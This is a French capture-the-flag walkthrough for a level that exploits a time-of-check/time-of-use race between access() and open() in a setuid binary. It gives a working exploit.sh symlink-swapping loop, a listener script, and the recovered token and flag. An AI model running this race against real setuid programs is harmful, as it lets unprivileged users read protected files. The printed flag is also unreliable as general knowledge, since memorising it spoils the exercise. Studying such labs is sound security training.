# Level 10

## 📋 Informations

- **Domaine** : Race Condition (TOCTOU - Time Of Check Time Of Use)
- **Objectif** : Exploiter un délai entre la vérification des droits (`access`) et l'ouverture du fichier (`open`) pour lire le `token`.

---

## 🔍 Exploration

Nous avons un binaire `level10` qui est setuid.
Il prend en paramètre un fichier et une adresse IP.

```bash
./level10
# ./level10 file host
```

Il semble envoyer le contenu du fichier à l'hôte spécifié sur le port 6969.

---

## 🛠️ Analyse

Analysons le comportement du binaire (version simplifiée) :

```c title:level10_simplified.c
int main(int argc, char **argv) {
    char *filename = argv[1];
    char *host = argv[2];

    // 1. VÉRIFICATION (Time Of Check)
    // access() vérifie si l'utilisateur RÉEL (RUID) a le droit de lire le fichier.
    if (access(filename, R_OK) == 0) {
        
        printf("Connecting to %s:6969 .. ", host);
        fflush(stdout);

        // 2. DÉLAI (Latence réseau)
        // Connexion au serveur distant...
        int sockfd = connect_to_host(host, 6969);
        write(sockfd, ".*( )*.\n", 8);

        printf("Connected!\nSending file .. ");
        
        // 3. UTILISATION (Time Of Use)
        // open() ouvre le fichier. Comme le binaire est SUID, 
        // il a le pouvoir d'ouvrir n'importe quoi si le check précédent est passé.
        int fd = open(filename, O_RDONLY);
        
        // Envoi du contenu sur le socket...
        send_file(fd, sockfd);
    }
    // ...
}
```

> [!IMPORTANT]
> **La faille : TOCTOU**
> Il s'écoule un laps de temps entre le moment où le programme vérifie les droits (`access`) et le moment où il ouvre réellement le fichier (`open`).
> Ce délai est ici augmenté par l'établissement de la connexion réseau.
>
> Si nous passons un fichier que nous avons le droit de lire (ex: `/tmp/test`) pour passer le `access()`, et que nous échangeons ce fichier par un lien symbolique vers `token` **juste après** le check mais **avant** le `open()`, le programme lira `token`.

---

## 🔓 Résolution

### 1. Préparation du Serveur
Il nous faut un serveur à l'écoute sur le port 6969 pour recevoir le flag.
Nous pouvons utiliser un script Python simple ou `netcat`.

```bash
netcat -l -p 6969
```

```python title:server.py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 6969))
s.listen(1)

while True:
    conn, addr = s.accept()
    print(f"Connection from {addr}")
    while True:
        data = conn.recv(1024)
        if not data: break
        print(data.decode("utf-8", "ignore"), end="")
    conn.close()
```
Lançons ce serveur dans un terminal (ou en background) : `python /tmp/server.py &`

### 2. Exploitation (Race Condition)
Nous allons utiliser une boucle infinie pour changer le lien symbolique très rapidement, et une autre boucle pour appeler le programme en boucle.

Créons un script shell `exploit.sh` dans `/tmp` :

```bash title:exploit.sh
#!/bin/bash

# Fichier leurre (que l'on a le droit de lire)
touch /tmp/access

# Boucle 1 : Changement frénétique du lien symbolique
while true; do
	ln -sf /tmp/access /tmp/token
	ln -sf /home/user/level10/token /tmp/token
done &

# Boucle 2 : Appel du programme vulnérable
# On espère tomber sur le bon timing : access(/tmp/access) -> OK ... open(/home/.../token)
while true; do
	/home/user/level10/level10 /tmp/token 127.0.0.1
done
```

### 3. Exécution

Lançons l'exploit :
```bash
sh /tmp/exploit.sh
```

Sur la sortie de notre serveur Python, nous verrons beaucoup de textes inutiles (le contenu de `/tmp/access`), mais tôt ou tard, le flag apparaîtra.

**Résultat :**
```text
.*( )*.
woupa2yuojeeaaed06riuj63c
```

**Flag Final :**
```text
feulo4b72j7edeahuete3no7c
```

---

## 📚 Notions utiles

- **TOCTOU (Time Of Check to Time Of Use)** : Classe de bugs où l'état du système change entre la vérification d'une condition et son utilisation.
- **Race Condition** : Comportement logiciel dépendant de la séquence ou du timing d'événements incontrôlables.
- **access() vs open()** : Ne jamais utiliser `access()` pour vérifier les droits avant d'ouvrir un fichier dans un binaire SUID. `open()` vérifie les droits lui-même au moment de l'ouverture.